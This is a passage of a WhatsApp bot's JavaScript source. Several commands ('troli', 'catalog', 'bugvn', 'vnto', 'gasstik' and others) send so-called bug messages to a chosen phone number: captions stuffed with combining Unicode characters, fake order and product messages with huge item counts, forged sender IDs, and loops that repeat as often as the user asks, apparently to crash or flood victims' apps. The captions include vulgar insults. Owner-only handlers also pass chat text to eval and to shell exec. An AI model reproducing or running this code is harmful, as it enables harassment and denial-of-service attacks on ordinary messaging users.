██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            }
            break

	case 'troli': {
	if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
	var troli = generateWAMessageFromContent(m.chat,{

	"orderMessage": {
 
	"orderId": "599519108102353",
 
	"thumbnail": thumb,
 
	"itemCount": 2022,
 
	"status": "INQUIRY",
 
	"surface": "CATALOG",
 
	"message": ` ${buttonvirus}`,
 
	"orderTitle": `${buttonvirus}`, // 
 
	"sellerJid": "6283131458282@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},{quoted: {
	key: {
	fromMe: false,
	participant: 
	`0@s.whatsapp.net`, // Fake sender Jid
	remoteJid: "status@broadcast"
	},
	message: {
	orderMessage: {
	itemCount: 999999999, // Bug
	status: 1,
	surface: 1,
	message: '😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃',
	orderTitle: '999999999', // Idk what this does
	sellerJid: `0@s.whatsapp.net` // Seller
	}
	}
	}, contextInfo:{}}) 
	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
	}
	}
	break
case 'catalog': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CATALOG 🔥➥ ${buttonvirus}`,
"description": `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CATALOG ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CATALOG`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰`,
"url": "wa.me/6288286858385"
},
"businessOwnerJid": "6288286858385@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break

case 'bugvn':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 }
 }
break
case 'bugstik':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
hisoka.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
}
}
break
case 'vnto':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'gasvn':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
  hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'stikto':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'gasstik':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
 hisoka.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
